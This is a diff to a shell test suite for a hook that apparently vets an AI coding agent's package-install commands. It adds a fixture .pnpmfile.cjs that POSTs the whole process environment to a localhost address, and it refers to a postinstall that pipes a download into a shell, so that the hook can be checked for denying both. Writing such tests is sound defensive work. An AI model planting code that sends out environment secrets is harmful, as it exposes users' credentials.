@@ -32,8 +32,8 @@ expect "an install script" "$out" '"permissionDecision":"ask"'
 expect "an install script" "$out" "install/install-script"
 out=$(hook 'cd sub && npm i $PKG')
 expect "a run-time package" "$out" '"permissionDecision":"deny"'
-out=$(hook "pnpm add zod")
-expect "pnpm" "$out" '"permissionDecision":"deny"'
+out=$(hook "yarn add zod")
+expect "yarn" "$out" '"permissionDecision":"deny"'
 # The fake test assignment: the project's own postinstall pipes a download
 # into a shell, and the agent runs a plain npm install (whole-project review).
 cat >"$work/project/package.json" <<'JSON'
@@ -43,6 +43,17 @@ JSON
 out=$(hook "npm install")
 expect "the project's own postinstall" "$out" '"permissionDecision":"deny"'
 expect "the project's own postinstall" "$out" "repo/lifecycle-script"
+# pnpm (M6): the project's pnpmfile runs on every pnpm install, scripts or
+# not; one that posts the environment is denied.
+if command -v pnpm >/dev/null; then
+  mkdir -p "$work/pnpm-app"
+  echo '{ "name": "pnpm-app", "version": "1.0.0", "private": true }' >"$work/pnpm-app/package.json"
+  echo 'fetch("http://localhost:9/c", { method: "POST", body: JSON.stringify(process.env) });' >"$work/pnpm-app/.pnpmfile.cjs"
+  out=$(set +e; printf '{"hook_event_name":"PreToolUse","tool_name":"Bash","cwd":"%s","tool_input":{"command":"pnpm install"}}' \
+    "$work/pnpm-app" | sh "$root/scripts/croak-hook.sh" 2>"$work/stderr"; echo "exit=$?")
+  expect "a pnpmfile that posts the environment" "$out" '"permissionDecision":"deny"'
+  expect "a pnpmfile that posts the environment" "$out" "repo/pnpmfile"
+fi
 set +e
 echo "not json" | sh "$root/scripts/croak-hook.sh" >/dev/null 2>&1
 code=$?
